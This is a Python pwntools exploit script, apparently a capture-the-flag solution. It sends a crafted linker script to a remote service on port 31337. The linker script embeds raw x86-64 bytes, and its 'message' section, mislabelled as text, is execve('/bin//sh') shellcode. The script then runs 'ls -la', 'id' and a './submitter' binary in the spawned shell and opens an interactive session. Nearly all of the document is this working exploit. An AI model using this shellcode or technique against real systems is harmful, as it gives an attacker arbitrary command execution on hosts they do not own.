#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
# context.log_level = "debug"

io = remote(HOST, int(PORT))
io.sendline(b"""OUTPUT_FORMAT("elf64-x86-64", "elf64-x86-64", "elf64-x86-64")
OUTPUT_ARCH(i386:x86-64)
ENTRY(_start)
SECTIONS
{
  . = 0x400000 + SIZEOF_HEADERS;
  .text : {
    _start = .;
    /* The syscall calling convention for linux on x86_64. /
    / Set the following registers and call "syscall" instruction. /
    /   %rax: syscall number /
    /   %rdi: arg0 /
    /   %rsi: arg1 /
    /   %rdx: arg2 /
    /   %r10: arg3 /
    /   %r8:  arg4 /
    /   %r9:  arg5 /
    / set the syscall number of write(2) /
    / mov $0x1,%rax /
    BYTE(0x48);
    BYTE(0xc7);
    BYTE(0xc0);
    BYTE(0x01);
    BYTE(0x00);
    BYTE(0x00);
    BYTE(0x00);
    / set arg0(== 1 == STDOUT_FILENO) of write(2) /
    / mov $0x1,%rdi /
    BYTE(0x48);
    BYTE(0xc7);
    BYTE(0xc7);
    BYTE(0x01);
    BYTE(0x00);
    BYTE(0x00);
    BYTE(0x00);
    / set arg1 of write(2) /
    / mov $message,$rsi /
    BYTE(0x48);
    BYTE(0xc7);
    BYTE(0xc6);
    LONG(message);
    / set arg2 (length of message) of write(2) /
    / mov $0xe,%rdx /
    BYTE(0x48);
    BYTE(0xc7);
    BYTE(0xc2);
    BYTE(0x0e);
    BYTE(0x00);
    BYTE(0x00);
    BYTE(0x00);
    / call write(2) /
    / syscall /
    BYTE(0x0f);
    BYTE(0x05);
    / set the syscall number of exit(2) /
    / mov $0x3c,%rax /
    BYTE(0x48);
    BYTE(0xc7);
    BYTE(0xc0);
    BYTE(0x3c);
    BYTE(0x00);
    BYTE(0x00);
    BYTE(0x00);
    / set arg0 of exit(2) /
    / mov $9x9,%rdi /
    BYTE(0x48);
    BYTE(0xc7);
    BYTE(0xc7);
    BYTE(0x00);
    BYTE(0x00);
    BYTE(0x00);
    BYTE(0x00);
    / call exit(2) /
    / syscall /
    BYTE(0x0f);
    BYTE(0x05);
  }
  .rodata : {
    message = .;
    /* "AAAAAAA~~~" */
    BYTE(0x48)
    BYTE(0x31)
    BYTE(0xff)
    BYTE(0x48)
    BYTE(0x31)
    BYTE(0xf6)
    BYTE(0x48)
    BYTE(0x31)
    BYTE(0xd2)
    BYTE(0x48)
    BYTE(0x31)
    BYTE(0xc0)
    BYTE(0x50)
    BYTE(0x48)
    BYTE(0xbb)
    BYTE(0x2f)
    BYTE(0x62)
    BYTE(0x69)
    BYTE(0x6e)
    BYTE(0x2f)
    BYTE(0x2f)
    BYTE(0x73)
    BYTE(0x68)
    BYTE(0x53)
    BYTE(0x48)
    BYTE(0x89)
    BYTE(0xe7)
    BYTE(0xb0)
    BYTE(0x3b)
    BYTE(0xf)
    BYTE(0x5)
  }
}

""")

sleep(1)
io.sendline(b"ls -la")
io.sendline(b"id")
io.sendline(b"asdasd")
io.sendline(b"./submitter")
sleep(1)
io.sendline(b"exit")
io.interactive()
